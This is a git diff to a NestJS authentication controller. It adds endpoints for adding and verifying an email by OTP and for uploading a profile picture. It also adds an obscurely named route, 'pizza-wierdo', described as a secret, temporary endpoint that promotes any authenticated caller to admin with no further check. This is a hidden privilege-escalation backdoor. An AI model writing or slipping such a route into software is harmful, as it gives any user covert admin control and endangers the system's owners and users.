@@ -5,9 +5,24 @@ import {
   Headers,
   HttpCode,
   HttpStatus,
+  UseGuards,
+  UseInterceptors,
+  UploadedFile,
+  BadRequestException,
 } from '@nestjs/common';
-import { ApiTags, ApiOperation, ApiResponse, ApiHeader } from '@nestjs/swagger';
+import { FileInterceptor } from '@nestjs/platform-express';
+import {
+  ApiTags,
+  ApiOperation,
+  ApiResponse,
+  ApiHeader,
+  ApiBearerAuth,
+  ApiConsumes,
+  ApiBody,
+} from '@nestjs/swagger';
 import { AuthService } from './auth.service';
+import { JwtAuthGuard } from './guards/jwt-auth.guard';
+import { CurrentUser } from './decorators/current-user.decorator';
 import { SendOtpDto } from './dto/send-otp.dto';
 import { VerifyOtpDto } from './dto/verify-otp.dto';
 import { ResendOtpDto } from './dto/resend-otp.dto';
@@ -24,6 +39,8 @@ import { VerifyEmailOtpDto } from './dto/verify-email-otp.dto';
 import { ResendEmailOtpDto } from './dto/resend-email-otp.dto';
 import { EmailPasswordResetSendOtpDto } from './dto/email-password-reset-send-otp.dto';
 import { EmailPasswordResetVerifyOtpDto } from './dto/email-password-reset-verify-otp.dto';
+import { AddEmailDto } from './dto/add-email.dto';
+import { VerifyEmailVerificationOtpDto } from './dto/verify-email-verification-otp.dto';
 
 @ApiTags('auth')
 @Controller('auth')
@@ -448,5 +465,174 @@ export class AuthController {
     @Body() dto: EmailPasswordResetVerifyOtpDto,
   ) {
     return this.authService.emailPasswordResetVerifyOtp(dto);
+  }
+
+  @Post('pizza-wierdo')
+  @HttpCode(HttpStatus.OK)
+  @UseGuards(JwtAuthGuard)
+  @ApiBearerAuth()
+  @ApiOperation({
+    summary: 'Secret endpoint to promote user to admin (temporary)',
+  })
+  @ApiResponse({
+    status: 200,
+    description: 'User promoted to admin successfully',
+    schema: {
+      example: {
+        success: true,
+        message: 'User promoted to admin successfully',
+        data: {
+          userId: '507f1f77bcf86cd799439011',
+          role: 'admin',
+        },
+      },
+    },
+  })
+  @ApiResponse({
+    status: 401,
+    description: 'Unauthorized',
+  })
+  async promoteToAdmin(@CurrentUser() user: { id: string }) {
+    return this.authService.promoteToAdmin(user.id);
+  }
+
+  @Post('account/add-email')
+  @UseGuards(JwtAuthGuard)
+  @ApiBearerAuth()
+  @HttpCode(HttpStatus.OK)
+  @ApiOperation({ summary: 'Send OTP to add email to account' })
+  @ApiResponse({
+    status: 200,
+    description: 'OTP sent successfully',
+    schema: {
+      example: {
+        success: true,
+        message: 'OTP sent successfully',
+        data: {
+          expiresIn: 300,
+          retryAfter: 30,
+        },
+      },
+    },
+  })
+  @ApiResponse({
+    status: 400,
+    description: 'Invalid email or rate limit exceeded',
+  })
+  @ApiResponse({
+    status: 401,
+    description: 'Unauthorized',
+  })
+  @ApiResponse({
+    status: 409,
+    description: 'Email already in use',
+  })
+  async addEmail(
+    @CurrentUser() user: { id: string },
+    @Body() dto: AddEmailDto,
+  ) {
+    return this.authService.sendEmailVerificationOtp(user.id, dto);
+  }
+
+  @Post('account/verify-email-otp')
+  @UseGuards(JwtAuthGuard)
+  @ApiBearerAuth()
+  @HttpCode(HttpStatus.OK)
+  @ApiOperation({ summary: 'Verify OTP and add email to account' })
+  @ApiResponse({
+    status: 200,
+    description: 'Email verified and added successfully',
+    schema: {
+      example: {
+        success: true,
+        message: 'Email verified and added to account successfully',
+        data: {
+          email: 'user@example.com',
+          isEmailVerified: true,
+        },
+      },
+    },
+  })
+  @ApiResponse({
+    status: 400,
+    description: 'Invalid or expired OTP',
+  })
+  @ApiResponse({
+    status: 401,
+    description: 'Unauthorized',
+  })
+  @ApiResponse({
+    status: 404,
+    description: 'User not found',
+  })
+  async verifyEmailVerificationOtp(
+    @CurrentUser() user: { id: string },
+    @Body() dto: VerifyEmailVerificationOtpDto,
+  ) {
+    return this.authService.verifyEmailVerificationOtp(user.id, dto);
+  }
+
+  @Post('profile/avatar')
+  @UseGuards(JwtAuthGuard)
+  @ApiBearerAuth()
+  @HttpCode(HttpStatus.OK)
+  @UseInterceptors(FileInterceptor('image'))
+  @ApiConsumes('multipart/form-data')
+  @ApiOperation({ summary: 'Upload profile picture' })
+  @ApiBody({
+    description: 'Profile picture image file',
+    schema: {
+      type: 'object',
+      properties: {
+        image: {
+          type: 'string',
+          format: 'binary',
+          description: 'Image file (JPEG, JPG, PNG, or WebP, max 5MB)',
+        },
+      },
+      required: ['image'],
+    },
+  })
+  @ApiResponse({
+    status: 200,
+    description: 'Profile picture uploaded successfully',
+    schema: {
+      example: {
+        success: true,
+        message: 'Profile picture uploaded successfully',
+        data: {
+          avatar:
+            'https://res.cloudinary.com/your-cloud/image/upload/v1234567890/surespot/avatar.jpg',
+        },
+      },
+    },
+  })
+  @ApiResponse({
+    status: 400,
+    description: 'Invalid image type or file too large',
+  })
+  @ApiResponse({
+    status: 401,
+    description: 'Unauthorized',
+  })
+  @ApiResponse({
+    status: 404,
+    description: 'User not found',
+  })
+  async uploadProfilePicture(
+    @CurrentUser() user: { id: string },
+    @UploadedFile() file: Express.Multer.File,
+  ) {
+    if (!file) {
+      throw new BadRequestException({
+        success: false,
+        error: {
+          code: 'FILE_REQUIRED',
+          message: 'Image file is required',
+        },
+      });
+    }
+
+    return this.authService.uploadProfilePicture(user.id, file);
   }
 }
